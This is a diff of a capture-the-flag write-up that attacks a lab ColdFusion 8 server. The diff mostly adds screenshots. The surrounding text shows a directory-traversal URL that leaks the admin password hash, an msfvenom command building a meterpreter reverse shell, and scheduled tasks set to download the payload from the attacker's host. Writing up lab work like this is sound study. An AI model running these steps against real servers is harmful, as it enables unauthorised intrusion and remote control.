@@ -268,10 +268,19 @@ With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/a
 
 We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!
 
-NOTE: While browsing through other write-ups, I found out that navigating directly to URL `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`, taken from [14641.py](https://www.exploit-db.com/exploits/14641), displays the hash password on screen immediately. 
+NOTE: While browsing through other write-ups, I found out that navigating directly to URL `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`, taken from [14641.py](https://www.exploit-db.com/exploits/14641), displays the hash password on screen immediately.
+
+![Passwordhash](https://user-images.githubusercontent.com/21957042/114262176-1c02d000-9a11-11eb-8229-e22ed777e167.png)
 
 ## 6. Enumerating ColdFusion Administrative Page
+Back to `http://10.10.10.11:8500/CFIDE/administrator/` and and supply the password `happyday`.
+
+![BackToAdminPage](https://user-images.githubusercontent.com/21957042/114262177-1c9b6680-9a11-11eb-82c8-5ace21f54861.png)
+
 Looking through the Administrator page, we could only see various Menus to view or modify.
+
+![AdminWebPage](https://user-images.githubusercontent.com/21957042/114262178-1d33fd00-9a11-11eb-911c-23b0990d8d73.png)
+
 ```
 Expand All / Collapse All
 
@@ -324,6 +333,8 @@ Packaging & Deployment
 	J2EE Archives
 ```
 Nothing interesting unfortunately. Suddenly, on the top right corner, I noticed a "System Information" button.
+
+![SystemInfo](https://user-images.githubusercontent.com/21957042/114262179-1dcc9380-9a11-11eb-9a4b-a28707c377c4.png)
 
 Here's the System Information:
 ```
@@ -437,6 +448,8 @@ Debugging & Logging
 ```
 Scheduled Tasks! We could use this to download and run our reverse shell payload.
 
+![TaskScheduler](https://user-images.githubusercontent.com/21957042/114262184-20c78400-9a11-11eb-8b9b-de692195f137.png)
+
 Let's create a payload.
 ```
 hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
@@ -449,15 +462,20 @@ Saved as: meterpreter.exe
 ```
 
 Let's Schedule New Task.
+
+![Task](https://user-images.githubusercontent.com/21957042/114262187-21f8b100-9a11-11eb-95a9-28560b3db8ef.png)
+
 ```
 Task Name: Reverse Shell
-Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+Frequency: Daily every 1 Min 1 Sec Start 6:22
 URL: http://10.10.x.x/meterpreter.exe
 Publish: Save output to a file
 File: C:\Users\tolis\meterpreter.exe
 Submit
 ```
 This task was scheduled successfully.
+
+![TaskScheduled](https://user-images.githubusercontent.com/21957042/114262186-21601a80-9a11-11eb-87ee-cb85ca1ea203.png)
 
 Let's run the Python HTTPServer also.
 ```
@@ -496,9 +514,12 @@ Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc
 ```
 
 Let's Schedule New Task again.
+
+![TaskNew](https://user-images.githubusercontent.com/21957042/114262188-22914780-9a11-11eb-8c59-015079ceb60d.png)
+
 ```
 Task Name: Reverse Shell
-Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+Frequency: Daily every 1 Min 1 Sec Start 6:22
 URL: http://10.10.x.x/meterpreter.exe
 Publish: Save output to a file
 File: C:\ColdFusion8\wwwroot\CFIDE\meterpreter.exe
